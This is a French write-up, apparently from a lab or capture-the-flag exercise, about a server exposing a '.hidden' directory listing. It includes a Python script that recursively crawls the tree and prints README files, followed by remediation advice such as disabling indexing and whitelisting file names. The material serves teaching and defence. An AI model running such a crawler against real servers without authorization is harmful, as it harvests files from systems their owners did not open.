
# Analyse de la faille de sécurité : Inclusion de fichiers via URL

## Description de la faille

Le problème vient de l'utilisation directe de liens dans une structure de répertoires exposée via une URL. 
Dans cet exemple, un site héberge une arborescence accessible via : 
```
http://192.168.129.219//.hidden/
```
Le serveur autorise l'accès à divers fichiers et répertoires via des liens non protégés. Cette vulnérabilité permet à un attaquant :
- D'explorer la structure complète des fichiers du serveur.
- D'extraire des fichiers sensibles (comme un fichier `README` contenant des informations critiques).

---

## Exploitation

### Étape 1 : Analyse initiale
L'attaquant explore les liens disponibles en parcourant l'arborescence :
```
http://192.168.129.219//.hidden/
```
À chaque niveau, il examine les fichiers disponibles.

### Étape 2 : Recherche de cibles spécifiques
L'objectif de l'attaquant est de trouver des fichiers spécifiques, par exemple :
- Des fichiers contenant des informations sensibles (`README`, `config.php`, etc.).

### Étape 3 : Extraction des données
Pour chaque fichier trouvé (comme `README`), l'attaquant :
1. Télécharge le fichier via son lien direct.
2. Filtre les données en fonction de leur pertinence.
3. Récupère des informations exploitables pour d'autres attaques.

Exemple de code Python utilisé par un attaquant pour automatiser cette tâche :
```python
import requests
import bs4 as bs

def scrapping_recursive(url):
    r = requests.get(url)
    soup = bs.BeautifulSoup(r.text, 'html.parser')
    if soup is not None:
        links = soup.find_all("a")
        for link in links:
            final_link = link.get('href')
            if final_link == "README":
                response = requests.get(url + final_link)
                if "Demande" not in response.text:
                    print(response.text)
            elif final_link != "../":
                scrapping_recursive(url + final_link)

url = "http://192.168.129.219/.hidden/"
scrapping_recursive(url)
```

---

## Comment corriger cette faille ?

### Étape 1 : Restreindre l'accès aux fichiers
Configurer le serveur pour empêcher l'accès aux répertoires non sécurisés :
- Utiliser des fichiers `.htaccess` pour interdire l'accès à des répertoires spécifiques.
- Désactiver l'indexation automatique des répertoires :
  ```apache
  Options -Indexes
  ```

### Étape 2 : Validation des entrées utilisateur
Si des paramètres utilisateur sont utilisés pour charger des fichiers, valider les entrées strictement :
- Autoriser uniquement les noms de fichiers ou identifiants valides :
  ```python
  VALID_FILES = ["file1.txt", "README"]
  if filename not in VALID_FILES:
      raise ValueError("Fichier non autorisé")
  ```

### Étape 3 : Utiliser des identifiants internes
Au lieu de laisser l'utilisateur fournir directement des chemins ou noms de fichiers, utiliser des identifiants internes :
- Exemple :
  - L'utilisateur demande `src=123`.
  - Le serveur traduit `123` en un chemin sécurisé interne (`files/README`).

### Étape 4 : Surveiller les journaux d'accès
Analyser régulièrement les journaux pour détecter des activités suspectes, telles que l'exploration de répertoires.

---

## Conclusion

Cette faille de sécurité montre l'importance de protéger les répertoires sensibles et de valider toutes les entrées utilisateur. Une configuration serveur stricte combinée à des contrôles côté application peut prévenir ces attaques.

